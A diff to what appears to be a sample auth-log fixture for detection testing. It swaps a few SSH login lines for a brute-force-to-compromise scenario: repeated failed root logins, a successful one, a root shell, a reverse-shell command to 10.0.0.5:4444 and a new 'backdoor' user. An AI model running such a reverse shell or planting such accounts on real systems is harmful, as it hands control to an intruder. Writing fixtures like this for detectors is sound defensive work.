@@ -1,4 +1,10 @@
-Feb 15 21:25:32 server sshd[1234]: Failed password for root from 192.168.1.10 port 22 ssh2
-Feb 15 21:25:33 server sshd[1234]: Failed password for root from 192.168.1.10 port 22 ssh2
-Feb 15 21:25:34 server sshd[1234]: Failed password for root from 192.168.1.10 port 22 ssh2
-Feb 15 21:25:35 server sshd[1234]: Accepted password for user from 192.168.1.20 port 22 ssh2
+2026-02-18T10:00:00 server sshd[1234]: Failed password for root from 192.168.1.10 port 22 ssh2
+2026-02-18T10:00:10 server sshd[1234]: Failed password for root from 192.168.1.10 port 22 ssh2
+2026-02-18T10:00:20 server sshd[1234]: Failed password for root from 192.168.1.10 port 22 ssh2
+2026-02-18T10:00:30 server sshd[1234]: Failed password for root from 192.168.1.10 port 22 ssh2
+2026-02-18T10:00:40 server sshd[1234]: Failed password for root from 192.168.1.10 port 22 ssh2
+2026-02-18T10:01:00 server sshd[1234]: Accepted password for root from 192.168.1.10 port 22 ssh2
+2026-02-18T10:02:00 server sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+2026-02-18T10:03:00 server bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+2026-02-18T10:04:00 server useradd[3456]: new user: name=backdoor, UID=1003, GID=1003, home=/home/backdoor, shell=/bin/bash
+
